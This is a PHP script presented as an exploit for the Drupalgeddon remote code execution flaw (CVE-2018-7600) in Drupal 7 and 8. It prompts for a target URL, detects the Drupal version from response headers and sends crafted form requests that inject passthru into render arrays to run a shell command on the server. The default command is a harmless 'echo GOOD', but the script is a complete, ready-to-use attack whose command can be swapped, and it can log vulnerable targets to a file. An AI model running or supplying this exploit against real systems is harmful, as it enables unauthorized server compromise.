<?php

    #   /$$$$$$$                                          /$$                           /$$       /$$                      /$$$$$$ 
	#  | $$__  $$                                        | $$                          | $$      | $$                     /$$__  $$
	#  | $$  \ $$  /$$$$$$  /$$   /$$  /$$$$$$   /$$$$$$ | $$  /$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$$  /$$$$$$  /$$$$$$$ |__/  \ $$
	#  | $$  | $$ /$$__  $$| $$  | $$ /$$__  $$ |____  $$| $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$| $$__  $$  /$$$$$$/
	#  | $$  | $$| $$  \__/| $$  | $$| $$  \ $$  /$$$$$$$| $$| $$  \ $$| $$$$$$$$| $$  | $$| $$  | $$| $$  \ $$| $$  \ $$ /$$____/ 
	#  | $$  | $$| $$      | $$  | $$| $$  | $$ /$$__  $$| $$| $$  | $$| $$_____/| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$      
	#  | $$$$$$$/| $$      |  $$$$$$/| $$$$$$$/|  $$$$$$$| $$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$/| $$  | $$| $$$$$$$$
	#  |_______/ |__/       \______/ | $$____/  \_______/|__/ \____  $$ \_______/ \_______/ \_______/ \______/ |__/  |__/|________/
	#                                | $$                     /$$  \ $$                                                            
	#                                | $$                    |  $$$$$$/                                                            

	/**
	 * Exploit : CVE-2018-7600 Drupalgeddon (SA-CORE-2018-002)
	 * Description : checfor Drupal 7.x and 8.x
	 * Author : Damian HART
	 */

	$command = 'echo GOOD';
	$config = array(
		'file_output' => false,
		'show_result' => true
	);
	$payload = array(
		'7' => [
			'url' => '/?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&name%5B%23markup%5D='.urlencode($command),
			'post_params' => '_triggering_element_name=name&form_id=user_pass'
		],
		'8' => [
			'url' => '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
			'post_params' => 'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=passthru&mail[a][#type]=markup&mail[a][#markup]='.$command
		]
	);

	function getVersion($target){
		$response_header = get_headers($target, true);
		$response_header = $response_header !== false ? array_change_key_case($response_header, CASE_LOWER) : false;
		if($response_header !== false && isset($response_header['x-generator'])){
			$x_generator = explode(chr(32), $response_header['x-generator']);
			if(strtolower($x_generator[0]) === 'drupal'){
				if($x_generator[1] == '8'){
					return 8;
				}elseif($x_generator[1] == '7'){
					return 7;
				}
			}
		}
		return false;
    }

	$uri = readline("Target (http://example.com) : ");

	echo '--------------------------------------------------------------------------------'.PHP_EOL;
	echo '[i] Target : '.$uri.PHP_EOL;
	$version = getVersion($uri);
    if($version !== false):
        echo '[+] Drupal?: v'.$version.'.x'.PHP_EOL;
    else:
        echo '[+] Drupal?: unknow'.PHP_EOL;
    endif;
	echo '--------------------------------------------------------------------------------'.PHP_EOL;
	if($version !== false):
		sleep(2);
		echo '[*] Testing: Code Execution'.PHP_EOL;
		sleep(1);
		echo '[i] Payload: '.$command.PHP_EOL;
		$curl = curl_init();
		curl_setopt($curl, CURLOPT_POST, true);
		curl_setopt($curl, CURLOPT_HEADER, false);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_HTTPHEADER, array(
			'Content-Type: application/x-www-form-urlencoded',
			'Connection: keep-alive'
		));
		curl_setopt($curl, CURLOPT_URL, $uri.$payload[$version]['url']);
		curl_setopt($curl, CURLOPT_POSTFIELDS, $payload[$version]['post_params']);
		$result = curl_exec($curl);
		if($version === 7):
			$dom = new DOMDocument;
			@$dom->loadHTML($result);
			$xp = new DOMXpath($dom);
			$input_tags = $xp->query('//input[@name="form_build_id"]');
			$token = $input_tags->item(0)->getAttribute('value');
			curl_setopt($curl, CURLOPT_URL, $uri.'/?q=file%2Fajax%2Fname%2F%23value%2F'.$token);
			curl_setopt($curl, CURLOPT_POSTFIELDS, 'form_build_id='.$token);
			$result = curl_exec($curl);
		endif;
		if(curl_errno($curl)):
			echo 'ERROR DEBUG'.PHP_EOL;
			print curl_error($curl); 
			die();
		endif;
		curl_close($curl);
		if(strpos($result, 'GOOD') !== false):
			echo '[+] Result : GOOD'.PHP_EOL;
			echo '[+] Target seems to be exploitable'.PHP_EOL;
			if($config['file_output']):
				file_put_contents('drupal_exploits['.$version.'].txt', $uri.PHP_EOL, FILE_APPEND | LOCK_EX); 
				echo '[!] Target added to the text output'.PHP_EOL;
			endif;
		else:
			echo '[*] Target not seems to be exploitable'.PHP_EOL;
		endif;
		if($config['show_result']):
			echo '-----------------------------------[ RESULT ]-----------------------------------'.PHP_EOL;
			echo $result;
		endif;
	else:
		echo '[*] Unsupported version'.PHP_EOL;
	endif;
	
